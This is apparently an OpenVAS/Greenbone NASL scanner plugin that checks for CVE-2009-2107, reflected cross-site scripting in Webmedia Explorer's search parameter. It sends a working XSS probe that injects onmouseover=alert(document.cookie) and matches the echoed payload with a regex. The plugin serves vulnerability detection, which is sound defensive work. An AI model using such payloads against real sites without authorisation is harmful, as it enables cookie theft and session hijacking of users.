# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:webmediaexplorer:webmedia_explorer";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100225");
  script_version("2023-07-27T05:05:08+0000");
  script_tag(name:"last_modification", value:"2023-07-27 05:05:08 +0000 (Thu, 27 Jul 2023)");
  script_tag(name:"creation_date", value:"2009-06-21 16:51:00 +0200 (Sun, 21 Jun 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2009-2107");
  script_name("Webmedia Explorer Multiple Cross Site Scripting Vulnerabilities");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("webmedia_explorer_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("WebmediaExplorer/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/35368");

  script_tag(name:"summary", value:"Webmedia Explorer is prone to multiple cross-site scripting
  vulnerabilities because it fails to sufficiently sanitize user-supplied data.");

  script_tag(name:"impact", value:"An attacker may leverage these issues to execute arbitrary script
  code in the browser of an unsuspecting user in the context of the affected site. This may allow the
  attacker to steal cookie-based authentication credentials and to launch other attacks.");

  script_tag(name:"affected", value:"Webmedia Explorer 5.0.9 and 5.10.0 are vulnerable. Other versions
  may also be affected.");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

url = string( dir, "/index.php?search=%22%20onmouseover=alert(document.cookie)%20---" );
req = http_get( item:url, port:port );
buf = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
if( ! buf )
  exit( 0 );

if( buf =~ "^HTTP/1\.[01] 200" && egrep( pattern:"<a href=.*onmouseover=alert\(document\.cookie\) ---", string:buf ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
